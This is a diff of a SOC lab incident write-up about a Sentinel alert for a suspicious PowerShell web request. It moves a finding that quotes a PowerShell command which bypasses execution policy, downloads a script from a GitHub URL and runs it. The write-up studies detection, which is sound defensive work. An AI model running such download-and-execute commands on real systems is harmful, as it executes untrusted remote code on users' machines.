@@ -75,11 +75,6 @@ This resulted in a Sentinel incident titled: “PowerShell Suspicious Web Reques
 #### ** Notes: For the lab, let’s pretend like I contacted the user and they said they recently installed a free software at the same time the events took place. (But the reality is in this case, the attack simulator downloaded the scripts and executed them.
 
 
-- Upon investigating the triggered incident "Soclab1 - Suspicious Powershell Invoke-WebRequest"
-- It was discovered that the following powershell script "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
-powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
-" was run on the device :Soclab1"
-
 
 - #### Entities (3)
  - Device: soclab1
@@ -94,6 +89,12 @@ powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
 
 
 #### ** Findings **
+
+- Upon investigating the triggered incident "Soclab1 - Suspicious Powershell Invoke-WebRequest"
+- It was discovered that the following powershell script "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
+powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
+" was run on the device :Soclab1"
+
 
 The incident was triggered on one device  "Soclab" by one user account "Soclab1"
 PowerShell was used to download malicious script "eicar.ps1" from external URLs: https://raw.githubusercontent[.]com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar[.]ps1
